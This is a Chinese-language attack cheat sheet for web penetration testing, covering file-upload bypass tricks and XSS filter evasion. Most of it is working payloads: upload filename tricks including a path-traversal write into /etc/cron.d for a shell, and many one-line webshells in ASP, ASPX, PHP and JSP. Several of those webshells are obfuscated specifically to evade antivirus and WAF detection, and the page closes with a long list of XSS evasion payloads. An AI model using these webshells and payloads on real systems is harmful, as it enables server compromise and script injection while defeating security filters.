文件上传  

对于文件上传测试，首先准备一个图片马 例如 shell.jpg ，抓取上传时的数据包，  
1.正常上传该文件，观察返回数据包内市是否存在上传路径，以及文件名是否被修改  
若文件名可控  
测试方法一：我们可以将 filename="shell.jpg" 修改为 filename="shell.php\.aaa*"  
测试方法二：我们可以将 filename="shell.jpg" 修改为 filename="shell.php/"  
测试方法三：我们可以将 filename="shell.jpg" 修改为 filename="shell.php"  
测试方法四：我们可以将 filename="shell.jpg" 修改为 filename="<script>alert(110)</script>.jpg"  
测试方法五：我们可以将 filename="shell.jpg" 修改为 filename=".php  
h.   
123"   

测试方法六：我们可以将 filename="shell.jpg" 修改为 filename="../../etc/cron.d/rootl.sh"通过计划任务去拿shell  
若文件名不可控  
我们就使用常规的测试方法和条件竞争去测试  

一句话木马 getshell 
asp

<% response.write("hello,world") %>
<%eval request("pass")%>

aspx

 <%@ Page Language="C#"%>
<% Response.Write("hello,world"); %>

<%@ Page Language="Jscript" validateRequest="false" %>
<%
function xxxx(str)
{
    return eval(str,"unsafe");
}
%>
<%var a = Request.Item["pass"];%>
<%var b = xxxx(a);%>
<%Response.Write(b);%>


php

<?php echo"hello world";?>
<?php @eval($_POST['pass']);?>

jsp

<%
out.println("Hello World");
%>

<%!
    class U extends ClassLoader {
        U(ClassLoader c) {
            super(c);
        }
        public Class g(byte[] b) {
            return super.defineClass(b, 0, b.length);
        }
    }
 
    public byte[] base64Decode(String str) throws Exception {
        try {
            Class clazz = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), str);
        } catch (Exception e) {
            Class clazz = Class.forName("java.util.Base64");
            Object decoder = clazz.getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, str);
        }
    }
%>
<%
    String cls = request.getParameter("pass");
    if (cls != null) {
        new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);
    }
%>

<?php assert(@$_POST['a']); ?>


<?php
$fun = create_function('',$_POST['a']);
$fun();
?>


<?php
$bb="eval";
$aa="bb";
$$aa($_POST['a']);
?>


<?php
$a=base64_decode("ZXZhbA==")
$a($_POST['a']);
?>

<?php
$a="e"."v";
$b="a"."l";
$c=$a.$b;
$c($_POST['a']);
?>

<script language="php">@eval_r($_GET[b])</script>

一句话木马：ASP篇
 

ASP一句话木马收集：

 <%eval request ("admin")%>

<%eval request("chopper")%>

<%execute request("chopper")%>

<%execute(request("chopper"))%>

<%ExecuteGlobal request("chopper")%>

<%Eval(Request(chr(35)))%>

<%dy=request("c")%><%Eval(dy)%> 

<%if request ("c")<>""then session("c")=request("c"):end if:if session("c")<>"" then execute session("c")%> 

<% if Request("c")<>"" then ExecuteGlobal request("c") end if %>

<%execute request("c")%><%'<% loop <%:%>

< %'<% loop <%:%><%execute request("a")%>

<script language=vbs runat=server>eval(request("c"))</script> 

<script language=VBScript runat=server>execute request("#")</script> 

<%eval(eval(chr(114)+chr(101)+chr(113)+chr(117)+chr(101)+chr(115)+chr(116))("c"))%>

<%eval""&("e"&"v"&"a"&"l"&"("&"r"&"e"&"q"&"u"&"e"&"s"&"t"&"("&"0"&"-"&"2"&"-"&"5"&")"&")")%>

<%execute(unescape("eval%20request%28%22aaa%22%29"))%>

UTF-7编码加密:
<%@ codepage=65000%><% response.Charset=”936″%><%e+j-x+j-e+j-c+j-u+j-t+j-e+j-(+j-r+j-e+j-q+j-u+j-e+j-s+j-t+j-(+j-+ACI-#+ACI)+j-)+j-%>
 
Script Encoder 加密  //密码c
<%@ LANGUAGE = VBScript.Encode %>
<%#@~^PgAAAA==~b0~"+$E+kYvEmr#@!@*rJ~O4+x,36mEDn!VK4mV~Dn5!+dYvEmr#~n NPrW,SBMAAA==^#~@%>

 

这段代码将"eval request(/*/z/*/)"逆序成")/*/z/*/(tseuqer lave", 以逃避特征码查杀, 当脚本被访问, 其代码会被动态的解码还原成原始的一句话后门. 当前90%以上的未知后门和变形后门都是使用此类动态解码技术

<%
Function MorfiCoder(Code)
MorfiCoder=Replace(Replace(StrReverse(Code),"/*/",""""),"\*\",vbCrlf)
End Function
Execute MorfiCoder(")/*/z/*/(tseuqer lave")
%>

 密码 z

 

可以躲过雷客图的一句话木马：

<%set ms = server.CreateObject("MSScriptControl.ScriptControl.1")
ms.Language="VBScript"
ms.AddObject "Response", Response
ms.AddObject "request", request
ms.AddObject "session", session
ms.AddObject "server", server
ms.AddObject "application", application
ms.ExecuteStatement ("ex"&"e"&"cute(request(chr(35)))")%>

 

<%
password=Request("class")
Execute(AACode("457865637574652870617373776F726429")):Function AACode(byVal s):For i=1 To Len(s) Step 2:c=Mid(s,i,2):If IsNumeric(Mid(s,i,1)) Then:Execute("AACode=AACode&chr(&H"&c&")"):Else:Execute("AACode=AACode&chr(&H"&c&Mid(s,i+2,2)&")"):i=i+2:End If:Next:End Function
%>


<%
password=Request("class")
Execute(DeAsc("%87%138%119%117%135%134%119%58%130%115%133%133%137%129%132%118%59")):Function DeAsc(Str):Str=Split(Str,"%"):For I=1 To Ubound(Str):DeAsc=DeAsc&Chr(Str(I)-18):Next:End Function
%>

 

简单的aspx免杀

<%@ Page Language="Jscript"%> <%eval(Request.Item["shell"],"unsafe");%>


复制代码
<%@ Page Language="Jscript"%>
<%
var a = Request.Item["M"];
var b = "un" + Char ( 115 ) + Char ( 97 ) + "fe";//主要就是这个地方 其他地方好像不会管
eval(a,b);
Response.Write("Test");
%>
复制代码
 

 

过狗一句话：

复制代码
<%
dim play
'
'
''''''''''''''''''
'''''''''
play = request("#")
%>
Error
<%
execute(play)
%>

jsp的一句话木马

asp打印hello
<% response.write("hello,world") %>

aspx打印hello
<%@ Page Language="C#"%>
<% Response.Write("hello,world"); %>

php打印hello
<?php echo"hello world";?>

jsp打印hell
<%
out.println("Hello World");
%>

asp一句话
<%eval request("pass")%>

aspx一句话

<%@ Page Language="Jscript" validateRequest="false" %>
<%
function xxxx(str)
{
    return eval(str,"unsafe");
}
%>
<%var a = Request.Item["pass"];%>
<%var b = xxxx(a);%>
<%Response.Write(b);%>

php一句话
<?php @eval($_POST['pass']);?>

jsp一句话

<%!
    class U extends ClassLoader {
        U(ClassLoader c) {
            super(c);
        }
        public Class g(byte[] b) {
            return super.defineClass(b, 0, b.length);
        }
    }
 
    public byte[] base64Decode(String str) throws Exception {
        try {
            Class clazz = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), str);
        } catch (Exception e) {
            Class clazz = Class.forName("java.util.Base64");
            Object decoder = clazz.getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, str);
        }
    }
%>
<%
    String cls = request.getParameter("pass");
    if (cls != null) {
        new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);
    }
%>

----

xss
#用法
  <img src=x onerror="window['al'+'ert'](0)"></img>  
  <img src=x onerror="window.alert(0)"></img>  
  <img src=x onerror="top['al'+'ert'](0)"></img>  
  <img src=x onerror="top.alert(0)"></img>  

- 动态调用
这个慎用因为是自动弹窗会一直探可以换成onclick代替

  <input/onfocus=_=alert,_(123)>  
  <input/onfocus=_=alert,xx=1,_(123)>  
  <input/onfocus=_=alert;_(123)>  
  <input/onfocus=_=alert;xx=1;_(123)>  
  <input/onfocus=_=window['alert'],_(123)>  
  <input/onfocus=_=window.alert,_(123)>  
  <input/%00/autofocus=""/%00/onfocus=.1|alert`XSS`>   

- 异常处理

  <svg/onload="window.onerror=eval;throw'=alert\x281\x29';">  
  <img src=1 onerror="window.onerror=eval;throw'=alert\x281\x29';">

- eval执行js
  
  <svg/onload=eval('ale'+'rt(1)')>  

- 关键字拼接  

  <svg/onload=location='javas'+'cript:ale'+'rt(1)'>  
  <svg/onload=window.location='javas'+'cript:ale'+'rt(1)'>  
  <svg/onload=location.href='javas'+'cript:ale'+'rt(1)'>  
  <svg/onload=window.open('javas'+'cript:ale'+'rt(1)')>  
  <svg/onload=location='javas'.concat('cript:ale','rt(1)')>  

- eval结合编码  
  <script>window['eval']("\x61\x6C\x65\x72\x74\x28\x31\x29")</script>  
  <script>window['eval']("\141\154\145\162\164\050\061\051")</script>  
  <script>window['eval']("\u0061\u006C\u0065\u0072\u0074\u0028\u0031\u0029")</script>  

- 大小写绕过  

  <sCriPt>alert(1);</scRiPt>  

- 双写绕过  
针对服务器删除敏感字符的过滤  
 <sCrsCriPtiPt>alert(1);</scRsCriPtiPt>  

<img src=x onerror=alert(1)>  
<img src="x" onerror="window['al'+'ert'](1)">  
<svg onload=alert(1)>  
<form id='test'></form><button form='test' formaction='javascript:alert(1)'>X</button>  
<a href=javascript:[1].find(alert)>xss</a>  
<img src=x onerror = &#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3a&#x61&#x6c&#x65&#x72&#x74&#x28&#x31&#x31&#x31&#x29>  
<iframe src=javascript:[1].find(alert)></iframe>  
<xmp onmousemove="alert(1)">test</xmp>  
<form id="test"></form><button form="test" formaction="javascript:prompt(xss)">X</button>  
<x onmouseover="top['ale'+'rt'].call(null,'xss')">test  
<img src=1 onerror=location="javascr"+"ipt:"+"%61%6C%65%72%74%28%31%29">  
<input/onfocus=_=alert,_(123)>  
<input onfocus=\u0061\u006C\u0065\u0072\u0074(1) autofocus>  
<input/%00/autofocus=""/%00/onfocus=.1|alert`XSS`>   
<svg/onload=setTimeout('\u0061\u006C\u0065\u0072\u0074\u0028\u0031\u0029')>  
<details open ontoggle=[43804..toString(36)].some(confirm)>  
<object data='data:text/html;base64,PFNDUklQVD5hbGVydCgneHNzJyk7PC9TQ1JJUFQ+' /src>  
<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>  
<table><caption onclick=aler\u0074(String.fr\u006fmCharC\u006fde(49))>Click me  

---
顶级绕过payload  
1.<script/qw123>alert%0d``</script>

构造闭合   
找能够使用的标签和函数  

<script>alert()</script>  
<script>(alert)()</script>  
<script>alert%0d()</script>  
<script>prompt()</script>  
<script>a=alert;a()</script>  

<script/123123>alert()</script>  
<%73%63%72%69%70%74>alert()</%73%63%72%69%70%74>  
<<SCRIPT>alert(733);//<</SCRIPT>  
<script>alert(String.fromCharCode(88,83,83))</script>  
<script>%61%6c%65%72%74%28%29</script>  
<script>eval("\141\154\145\162\164\50\61\51");</script>  
<script>\u0061\u006c\u0065\u0072\u0074(xss)</script>  
<script>\u0061\u006C\u0065\u0072\u0074(88199)</script>  

<img src=x onerror = &#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3a&#x61&#x6c&#x65&#x72&#x74&#x28&#x31&#x31&#x31&#x29>

<a href=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>Click</a><svg/onload=setTimeout('\x61\x6C\x65\x72\x74\x28\x31\x29')>

<iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E">

2
\"\u003cinput/onfocus=_=confirm,_(123)\u003e

a. 空格过滤绕过
常规XSS过滤可能会拦截onfocus="confirm(123)"中的空格。

绕过方式：用/代替空格，写成<input/onfocus=...>，使得HTML解析器仍能正确识别属性。

b. 关键词和括号过滤
某些过滤器会拦截confirm()函数调用或括号()。

绕过方式：

通过赋值操作 _=confirm 将函数赋值给变量 _。

使用逗号运算符 ,_(123) 执行函数（逗号返回最后一个表达式的值）。

最终等效于 confirm(123)，但避开了直接出现 confirm( 或 )。

c. 属性引号过滤  
如果过滤器要求事件处理属性必须用引号（如onfocus="..."），此Payload未使用引号仍能生效。

绕过方式：HTML允许属性值不加引号（除非包含空格或特殊字符）。

d. 短标签和混淆  
短标签 <input/> 和非常规写法（如省略标签名后的空格）可能绕过基于正则的过滤

----
复杂编码绕过  
<iframe src=javascript:alert(1)>

十进制html编码  
<iframe src=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>

十六进制html编码  
<iframe src=&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;> 

不带分号形式  
<iframe src=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x31&#x29>

填充0的形式  
<iframe src=&#x0006A&#x00061&#x00076&#x00061&#x00073&#x00063&#x00072&#x00069&#x00070&#x00074&#x0003A&#x00061&#x0006C&#x00065&#x00072&#x00074&#x00028&#x00031&#x00029>

部分关键字绕过  
<iframe src=javas&#x09;cript:alert(1)></iframe> //Tab  
   <iframe src=javas&#x0A;cript:alert(1)></iframe> //回车  
   <iframe src=javas&#x0D;cript:alert(1)></iframe> //换行  
   <iframe src=javascript&#x003a;alert(1)></iframe> //编码冒号  
   <iframe src=javasc&NewLine;ript&colon;alert(1)></iframe> //HTML5 新增的实体命名编码，IE6、7下不支持  
   <a href=javas&#x09;cript:alert(1)>  

url编码  
<a href="{here}">xx</a>  
<iframe src="{here}">  

二次URL编码  
<iframe src="javascript:%2561%256c%2565%2572%2574%2528%2531%2529"></iframe>  
结合16进制html编码  
<iframe src="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;%61%6c%65%72%74%28%31%29"></iframe>  
Unicode编码  
<input onfocus=location="javascript:\u0061\u006C\u0065\u0072\u0074\u0028\u0031\u0029" autofocus>   
<input onfocus=\u0061\u006C\u0065\u0072\u0074(1) autofocus>  

八进制及十六进制  
<svg/onload=setTimeout('\x61\x6C\x65\x72\x74\x28\x31\x29')>  
<svg/onload=setTimeout('\141\154\145\162\164\050\061\051')>  
<svg/onload=setTimeout('\u0061\u006C\u0065\u0072\u0074\u0028\u0031\u0029')>  
<script>eval("\x61\x6C\x65\x72\x74\x28\x31\x29")</script>  
<script>eval("\141\154\145\162\164\050\061\051")</script>  
<script>eval("\u0061\u006C\u0065\u0072\u0074\u0028\u0031\u0029")</script>  

payload平台：https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html

----
补充几个冷门的  
">符合被实体了,把post请求改变成mutipart格式，响应包显示成功。  
<img width="1123" height="1013" alt="image" src="https://github.com/user-attachments/assets/7c4a4d86-fbb7-48d6-ac5e-13ed73a495f1" />

文本编辑器中的xss  
<iframe src=javascript:[1].find(alert)></iframe>

<img width="1261" height="1111" alt="image" src="https://github.com/user-attachments/assets/9295641a-a6c2-4680-81d8-ab7365b3fd8f" />

waf过滤

未知过滤，开始从<测  
输入<<< 提示你输入的字符不允许，请重新提交！ 证明过滤了<<< 重复测试看改了些什么  
发现unicode转义绕过行得通  
\u003c = < ， 配一个冷门触发标签 <xml onmousemove="alert(1)">  同时注意json语法转义 \"

<img width="1261" height="1111" alt="image" src="https://github.com/user-attachments/assets/593049c6-bab5-4c1f-b9c7-976a16e45f23" />

<img width="1087" height="403" alt="image" src="https://github.com/user-attachments/assets/162f978c-019e-4969-903b-d769e572e79c" />



 
